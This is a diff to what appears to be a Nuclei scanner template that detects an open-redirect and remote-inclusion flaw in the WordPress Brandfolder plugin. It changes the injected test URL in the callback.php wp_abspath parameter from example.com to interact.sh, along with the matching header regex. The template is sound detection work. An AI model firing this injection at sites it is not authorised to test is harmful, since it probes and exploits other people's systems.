@@ -1,5 +1,4 @@
 id: brandfolder-open-redirect
-
 info:
   name: WordPress Brandfolder Plugin Open Redirect
   author: 0x_Akoko
@@ -8,14 +7,12 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/39591
   tags: wordpress,wp-plugin,lfi,rfi
-
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://example.com/"
-
+      - "{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/"
     matchers:
       - type: regex
         regex:
-          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)example\.com.*$'
+          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)interact\.sh.*$'
         part: header
